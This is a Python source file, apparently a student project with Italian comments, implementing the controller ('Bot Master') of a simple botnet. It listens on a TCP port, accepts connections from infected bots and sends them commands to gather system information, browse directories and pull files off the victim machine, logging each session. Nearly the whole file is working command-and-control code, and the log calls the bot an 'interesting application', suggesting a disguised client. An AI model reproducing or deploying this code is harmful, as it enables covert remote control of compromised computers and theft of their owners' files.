"""
Bot Master

AUTORI: Matteo Marino, Alessandro Trincone, Vincenzo Papale
"""
from socket import *
from functions import *

serverPort = 12000                          #Porta su cui opera il bot master
serverSocket = socket(AF_INET,SOCK_STREAM)  #Crea la socket    
serverSocket.bind( ('',serverPort) )        #Associazione della porta alla socket del bot master
serverSocket.listen(1)                      #Inizia l'ascolto dei bot in arrivo
report = open("./Log.txt","a")              #Genera un report della sessione
report.write(datetime.now().strftime("%d-%m-%Y") + "\n")
bot = 1        #Counter del n° di bot connessi
while True:
    com = " "
    client, addr = serverSocket.accept()       #Accetta la prima connessione in arrivo
    report.write("[" + datetime.now().strftime("%H:%M:%S") + "] Connesso\n")
    print("Bot n " + str(bot) + " Connesso\n")
    bot = bot + 1   #Aggiorna il counter dei bot connessi
    while True:
        try:
            com = input ("\nInserire un comando (\"help\" per la lista dei comandi): ")
            comando = "x"
            #Recupera info sul sistema
            if com == "system":
                comando = "1"                
                report.write("[" + datetime.now().strftime("%H:%M:%S") + "] \"Bot Master\" : " + com + "\n")
            #Visualizza i file/directory della cartella corrente
            elif com == "ls":
                comando = "2"
                report.write("[" + datetime.now().strftime("%H:%M:%S") + "] \"Bot Master\" : ls\n")
            #Cambia directory inserendo la directory destinazione dopo cd (cd directory)
            elif com[0:3] == "cd ":
                comando = "3" + com[2:]
                report.write("[" + datetime.now().strftime("%H:%M:%S") + "] \"Bot Master\" : " + com + "\n")
            #Visualizza la current working directory
            elif com == "pwd":
                comando = "4"
                report.write("[" + datetime.now().strftime("%H:%M:%S") + "] \"Bot Master\" : pwd\n")
            #Legge un file presente nella working directory
            elif com[0:9] == "download ":
                file = com[9:]
                comando = "5" + file
                report.write("[" + datetime.now().strftime("%H:%M:%S") + "] \"Bot Master\" : " + com + "\n")
            #Visualizza la lista dei comandi
            elif com == "help":
                cmd_list()
                continue
            #Chiude la connessione
            elif com == "exit":
                comando = "exit"
                report.write("[" + datetime.now().strftime("%H:%M:%S") + "] \"Bot Master\" : exit\n")
            elif com == "close":
                comando = "exit"
                report.write("[" + datetime.now().strftime("%H:%M:%S") + "] \"Bot Master\" : close\n")
            else:
                print("Comando non riconosciuto\n")
                continue
            client.send(comando.encode())
            if comando == "exit":
                print ("Connessione terminata")
                report.write("[" + datetime.now().strftime("%H:%M:%S") + "] Disconnesso\n\n")
                break
            if com[0:9] == "download ":
                filename = com[9:]
                try:
                    packs = []
                    bytesletti = 0
                    msglen = int(client.recv(4096).decode())
                    while bytesletti < msglen:
                        pack = client.recv(min(msglen - bytesletti,4096))
                        if pack == '':
                            raise RuntimeError
                        packs.append(pack)
                        bytesletti = bytesletti + len(pack)
                    download_file(packs,filename)
                    report.write("[" + datetime.now().strftime("%H:%M:%S") + "] downloaded" + filename + "\n")
                    print("donwloaded " + filename + "\n")
                except RuntimeError:
                    print("Connessione Interrotta\n")
            else:
                messaggio = client.recv(4096).decode()
                print(messaggio + "\n")
                report.write("[" + datetime.now().strftime("%H:%M:%S") + "] \"Applicazione Interessante\" : \n" + messaggio + "\n")
        except ConnectionAbortedError:
            print("Connessione interrotta dall'host\n")
            f = open("crashreport.txt","a")
            f.write(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " BotMaster : Connessionne interrotta dall'host\n")
            f.close()
            break
        except ConnectionError:
            print("Errore di connessione\n")
            f = open("crashreport.txt", "a")
            f.write(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " BotMaster : Errore di connessione\n")
            f.close()
            break
    if com == "close":
        report.close()
        break
    